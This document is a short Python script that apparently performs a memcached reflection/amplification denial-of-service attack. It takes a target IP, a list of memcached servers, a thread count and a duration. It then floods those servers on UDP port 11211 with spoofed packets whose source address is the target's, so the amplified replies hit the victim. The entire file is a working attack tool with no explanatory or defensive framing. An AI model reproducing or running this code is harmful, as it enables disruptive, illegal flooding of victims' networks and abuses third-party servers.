import time
import random
import threading
from scapy.all import *

ip = raw_input("Target: ")
threads = input("Threads: ")
open_list = raw_input("List: ")
timer = float(input("Time(S): "))

with open(open_list, "r") as fd:
	lines = fd.readlines()

payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

i = 0
mem_list = []

for line in lines:
	mem_list.append(line.rstrip("\n"))

if int(threads) > int(len(mem_list)):
	print("")
	print("Current Threads: %s" % threads)
	print("Max Threads: %s" % len(mem_list))
	print("Quitting...")
	quit()

timeout = time.time() + 1 * timer

def memflood():
	try:
		def memflooder():
			global i
			while time.time() < timeout:
				port = random.randint(1, 65535)
				packet = IP(src=ip, dst=mem_list[i])/UDP(sport=port, dport=11211)/Raw(load=payload)
				i += 1
				send(packet, verbose=0)

		for i in range(1):
			thread = threading.Thread(target=memflooder)
			thread.start()
	except:
		pass

for i in range(int(threads)):
	thread = threading.Thread(target=memflood)
	thread.start()
